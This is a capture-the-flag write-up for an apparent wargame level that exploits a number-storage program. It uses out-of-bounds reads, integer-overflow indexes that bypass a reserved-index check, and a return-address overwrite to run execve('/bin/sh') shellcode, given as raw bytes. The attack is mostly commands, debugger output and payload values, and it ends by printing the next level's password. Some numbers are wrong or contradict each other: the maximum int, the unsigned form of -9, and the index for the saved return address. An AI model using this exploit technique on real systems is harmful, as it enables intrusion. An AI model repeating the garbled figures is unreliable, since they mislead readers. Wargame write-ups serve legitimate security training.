# Level07
This program is a storage service which store and read a number (int) in a buffer of 0x190 bytes. There's 3 commands to use it:
* store : read user input to get the index and the number to store. If the index % 3 == 0, you can't store at this index because this index is reserved for wil. If it's not the case, store the number read at the given index
* read : read user input and print the number at the given index
* quit : simply quit the program

To attack this binary, 'read' or 'store' commands are the only way to achieve this. In fact, since there's no restrictions for the value of index, we can store and read values outside of the buffer. Let's see what's outside this buffer:

```bash
for((i=0;i<150;i++)); do OUTPUT=`/home/users/level07/level07 < <(python -c "print('read\n$i\nquit')") | grep 'Input command:  Index:'` ; NB=`echo $OUTPUT | cut -d " " -f 8`; HEX=`printf %x $NB` ; echo $OUTPUT | awk '{ print $1,$2,$3,$4,$5,$6,$7,"0x'"$HEX"'"}' ; done
```

```
[...]
Input command: Index: Number at data[113] is 0x0
Input command: Index: Number at data[114] is 0xf7e45513 	(old eip main)
Input command: Index: Number at data[115] is 0x3		(int ac)
Input command: Index: Number at data[116] is 0xffffd7a4
Input command: Index: Number at data[117] is 0xffffd7b4
Input command: Index: Number at data[118] is 0xf7fd3000
Input command: Index: Number at data[119] is 0x0
[...]
```

After some deducing, we can find the old eip of main at the index 114. But we can't overwrite it because 114 % 3 == 0, this is a reserved index for wil.
However, this crappy storage use the following instructions :

```c
*(unsigned int *)(buffer + index * 4) = nb;
```

We can use an overflow with the multiplication of index * 4 which is an int. The max value of an int in decimal is 4294967296(5) so if we divide this number by 4, the number 1073741824 is also the index 0. Same logic for the number 1073741938 which is also the index 114.
Now we can overwrite old eip of main and since the stack is executable, we can put inside the buffer a shellcode. Let's find the address of the buffer.
In the function 'read_number' we can see the instruction:

```
0x80486ff <read_number+40>:  add    eax,DWORD PTR [ebp+0x8]
```

This instruction load the address of the buffer. We can find the index of this buffer with gdb:

```
gdb$
--------------------------------------------------------------------------[regs]
  EAX: 0x00000004  EBX: 0xFFFFD564  ECX: 0x0000000A  EDX: 0xF7FD08C4  o d I t s z a p c
  ESI: 0xFFFFD6FC  EDI: 0x08048D65  EBP: 0xFFFFD538  ESP: 0xFFFFD510  EIP: 0x080486FF
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
--------------------------------------------------------------------------[code]
=> 0x80486ff <read_number+40>:  add    eax,DWORD PTR [ebp+0x8]
   0x8048702 <read_number+43>:  mov    edx,DWORD PTR [eax]
   0x8048704 <read_number+45>:  mov    eax,0x8048b1b
   0x8048709 <read_number+50>:  mov    DWORD PTR [esp+0x8],edx
   0x804870d <read_number+54>:  mov    edx,DWORD PTR [ebp-0xc]
   0x8048710 <read_number+57>:  mov    DWORD PTR [esp+0x4],edx
   0x8048714 <read_number+61>:  mov    DWORD PTR [esp],eax
   0x8048717 <read_number+64>:  call   0x8048470 <printf@plt>
--------------------------------------------------------------------------------
0x080486ff in read_number ()
gdb$ x/wx $ebp+0x8
0xffffd540:     0xffffd564
```

(0xffffd540 - 0xffffd564) / 4 = -9
The index of our buffer is -9. If we use the 'read' command without gdb, it will be 4294956436.
We can finally store our shellcode. We need to break down our shellcode in multiple int part and overflow the index when this index is reserved. To do this, we build a bash script in the 'Ressources' directory to inject all this stuff. The most importants variables to set are the following ones:
* SHELLCODE : the shellcode we used in the previous exercises -> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
* INDEX_OLD_EIP : index in decimal for old eip -> 4294956436
* INDEX_SHELLCODE_ADDRESS : index in decimal for the shellcode address -> -9

We execute the script :
```

level07@OverRide:/home/users/level07$ /tmp/payload.bash
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
[...]
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

The flag is **7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC**

